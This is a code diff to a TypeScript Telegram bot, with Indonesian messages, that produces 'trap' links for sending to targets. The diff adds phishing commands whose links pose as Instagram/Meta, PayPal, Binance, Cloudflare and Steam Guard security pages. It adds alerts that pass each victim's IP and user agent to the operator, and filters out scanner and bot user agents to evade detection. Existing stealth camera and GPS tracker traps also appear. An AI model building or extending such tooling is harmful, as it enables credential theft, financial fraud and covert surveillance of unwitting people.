@@ -56,22 +56,23 @@ async function startServer() {
   console.log(`[STARTUP] Target Port: ${PORT} (from env: ${process.env.PORT || 'not set'})`);
 
   // Stateless Trap ID Generation & Validation
-  const generateTrapId = (chatId: number) => {
+  const generateTrapId = (chatId: number | string) => {
     return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
   };
 
   const suspeciousAgents = ['amphp', 'python', 'go-http-client', 'curl', 'wget'];
 
-   const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
-    return false; // Proceed anyway
+  const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
+    if (!userAgent) return false;
+    const ua = userAgent.toLowerCase();
+    return suspeciousAgents.some(agent => ua.includes(agent)) || ua.includes('bot') || ua.includes('telegram');
   };
 
-  const getChatIdFromTrapId = (trapId: string): number | null => {
+  const getChatIdFromTrapId = (trapId: string): string | null => {
     try {
       const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
       if (decoded.includes('-OSINT-')) {
-        const idStr = decoded.split('-OSINT-')[0];
-        return parseInt(idStr, 10);
+        return decoded.split('-OSINT-')[0];
       }
       return null;
     } catch {
@@ -356,8 +357,6 @@ async function startServer() {
       const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
       const targetIp = String(ip).split(',')[0].trim();
       
-      // No longer sending Telegram notification here to avoid link preview spam.
-      // Bot owner requested to only notify when the user clicks 'Verify'.
       targetsData.push({
         id: id,
         timestamp: new Date().toISOString(),
@@ -366,6 +365,19 @@ async function startServer() {
         ua: String(userAgent)
       });
       saveTargets();
+
+      // Send telegram notification if it's not a bot
+      if (!isSuspeciousAgent(userAgent)) {
+        const msg = `⚡ <b>LINK CLICK DETECTED</b> ⚡\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
+                    `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n` +
+                    `📖 <b>USER_AGENT:</b>\n<code>${userAgent}</code>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `⚠️ <i>Menunggu target mengizinkan akses / klik Verify untuk detail lengkap...</i>`;
+        
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+      }
     }
 
     const template = templates[tmplId] || templates['1'];
@@ -965,7 +977,7 @@ async function startServer() {
     ]);
 
     bot.command('trap_camera', (ctx) => {
-      const id = generateTrapId(ctx.chat!.id);
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
       const trapUrl = `${appHost.replace(/\/$/, '')}/t/camera_stealth/${id}`;
       ctx.reply(`📸 <b>STEALTH CAMERA INJECT</b>\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
@@ -976,13 +988,68 @@ async function startServer() {
     });
 
     bot.command('trap_gps', (ctx) => {
-      const id = generateTrapId(ctx.chat!.id);
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
       const trapUrl = `${appHost.replace(/\/$/, '')}/t/gps_tracker/${id}`;
       ctx.reply(`📍 <b>PRECISION GPS TRACKER</b>\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
                 `Kirim Link ini kepada target. Saat target memberikan akses lokasi, koordinat akan dilacak dengan Google Maps level presisi.\n\n` +
                 `🔗 <code>${trapUrl}</code>\n\n` +
                 `⚠️ <i>Pastikan target tidak menggunakan VPN palsu.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('trap_ig', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/meta_login/${id}`;
+      ctx.reply(`📸 <b>INSTAGRAM/META PHISHING OSINT</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Link ini menyamar sebagai peringatan keamanan (Security Alert) dari Instagram.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Target yang mengklik akan dimintai verifikasi sesi perlindungan akun.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('trap_paypal', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/paypal/${id}`;
+      ctx.reply(`💳 <b>PAYPAL SECURITY AUDIT</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Link menyamar sebagai peringatan aktivitas tidak wajar dari PayPal.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Sangat efektif dengan target platform Fintech.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('trap_binance', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/binance/${id}`;
+      ctx.reply(`💱 <b>BINANCE CRYPTO AUDIT</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Link menyamar sebagai halaman Withdrawal Security Binance.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Target harus memverifikasi sesi untuk melindungi aset dompet mereka.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('trap_cloudflare', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/cloudflare/${id}`;
+      ctx.reply(`☁️ <b>CLOUDFLARE EDGE TRAP</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Link menyamar sebagai halaman antrian "Verify you are human" Cloudflare yang sangat terpercaya.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Salah satu penyamaran paling natural.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('trap_steam', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/steam/${id}`;
+      ctx.reply(`🎮 <b>STEAM GUARD INJECT</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Link menyamar sebagai verifikasi sekuritas akun Steam Guard.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Dirancang khusus untuk target demographics Gaming.</i>\n` +
                 `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
@@ -2562,9 +2629,10 @@ async function startServer() {
     };
 
     bot.command('wa_connect', async (ctx) => {
+      if (globalWaSock) return ctx.reply("✅ WA Bot sudah terkoneksi sebelumnya.");
       if (waConnecting) return ctx.reply("⏳ Sedang mencoba koneksi WA, mohon tunggu...");
       waConnecting = true;
-      const progressMsg = await ctx.reply("🔄 Memulai session Baileys WhatsApp...");
+      const progressMsg = await ctx.reply("🔄 Memulai session Baileys WhatsApp...").catch(() => null);
       
       const sessionDir = `./wa_auth_global`;
       try {
@@ -2592,9 +2660,9 @@ async function startServer() {
           if (qr) {
             try {
               const qrBuffer = await QRCode.toBuffer(qr);
-              await ctx.telegram.sendPhoto(ctx.chat.id, { source: qrBuffer }, { caption: "📱 <b>SCAN QR INI</b>\nBuka WhatsApp > Perangkat Tertaut > Tautkan Perangkat. QR ini berlaku 20 detik.", parse_mode: 'HTML' });
+              await ctx.telegram.sendPhoto(ctx.chat.id, { source: qrBuffer }, { caption: "📱 <b>SCAN QR INI</b>\nBuka WhatsApp > Perangkat Tertaut > Tautkan Perangkat. QR ini berlaku 20 detik.", parse_mode: 'HTML' }).catch(() => {});
             } catch(e) {
-              ctx.reply("❌ Gagal mengenerate QR code.");
+              ctx.reply("❌ Gagal mengenerate QR code.").catch(() => {});
             }
           }
           
@@ -2604,16 +2672,16 @@ async function startServer() {
             const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
             console.log('WA connection closed, reconnecting:', shouldReconnect);
             if (shouldReconnect) {
-               ctx.reply("⚠️ Koneksi WA terputus, mencoba relogin otomatis (pastikan tidak log out dari aplikasi).");
+               ctx.reply("⚠️ Koneksi WA terputus, mencoba relogin otomatis (pastikan tidak log out dari aplikasi).").catch(() => {});
                // Usually Baileys will just crash or we need to restart it automatically, pm2 will handle restart if it throws error
             } else {
-               ctx.reply("❌ Sesi WA Logged Out. Silakan hapus folder auth WA dan /wa_connect ulang.");
+               ctx.reply("❌ Sesi WA Logged Out. Silakan hapus folder auth WA dan /wa_connect ulang.").catch(() => {});
                waConnecting = false;
                try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch(err){}
             }
           } else if (connection === 'open') {
              globalWaSock = sock;
-             ctx.reply("✅ <b>WHATSAPP BOT TERHUBUNG!</b>\nNomor ini sekarang merespon pesan otomatis dan mewarisi semua command Telegram.", { parse_mode: 'HTML' });
+             ctx.reply("✅ <b>WHATSAPP BOT TERHUBUNG!</b>\nNomor ini sekarang merespon pesan otomatis dan mewarisi semua command Telegram.", { parse_mode: 'HTML' }).catch(() => {});
              waConnecting = false;
           }
         });
@@ -2630,7 +2698,7 @@ async function startServer() {
            const text = m.message?.conversation || m.message?.extendedTextMessage?.text || "";
            
            if (text) {
-             await sock.readMessages([m.key]);
+             await sock.readMessages([m.key]).catch(()=>{});
              
              // Analyze entities if it's a command
              let entities: any[] = [];
@@ -2643,7 +2711,7 @@ async function startServer() {
                  update_id: Math.floor(Math.random() * 10000000),
                  message: {
                      message_id: Math.floor(Math.random() * 10000),
-                     from: { id: parseInt(senderNumber), is_bot: false, first_name: m.pushName || "WA User" },
+                     from: { id: parseInt(senderNumber) || 0, is_bot: false, first_name: m.pushName || "WA User" },
                      chat: { id: `@wa_${senderNumber}`, type: 'private' },
                      date: Math.floor(Date.now()/1000),
                      text: text,
@@ -2657,7 +2725,7 @@ async function startServer() {
         
       } catch (err: any) {
         waConnecting = false;
-        ctx.reply("❌ Gagal memulai WA Bot: " + err.message);
+        ctx.reply("❌ Gagal memulai WA Bot: " + err.message).catch(() => {});
       }
     });
 
